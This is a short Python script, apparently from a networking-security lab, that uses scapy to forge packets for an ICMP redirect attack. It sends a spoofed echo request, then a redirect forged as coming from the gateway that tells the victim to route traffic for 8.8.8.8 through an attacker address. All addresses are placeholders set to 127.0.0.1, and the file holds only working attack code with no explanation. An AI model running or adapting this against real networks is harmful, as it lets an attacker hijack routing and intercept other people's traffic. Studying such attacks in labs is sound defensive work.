#!/usr/bin/env python3

from scapy.all import *

victim_ip = "127.0.0.1"

attacker_ip = "127.0.0.1"

gateway = "127.0.0.1"

destination = "8.8.8.8"

packet1 = IP()
packet1.src=destination
packet1.dst=victim_ip
icmp=ICMP()
icmp.type=8
icmp.code=0
icmp.gw=gateway
send(packet1/icmp)

packet2_1 = IP()
packet2_1.src = gateway
packet2_1.dst = victim_ip
icmp = ICMP()
icmp.type=5
icmp.code=1
icmp.gw = attacker_ip
packet2_2 = IP()
packet2_2.src = victim_ip
packet2_2.dst = destination
send(packet2_1/icmp/packet2_2/UDP())
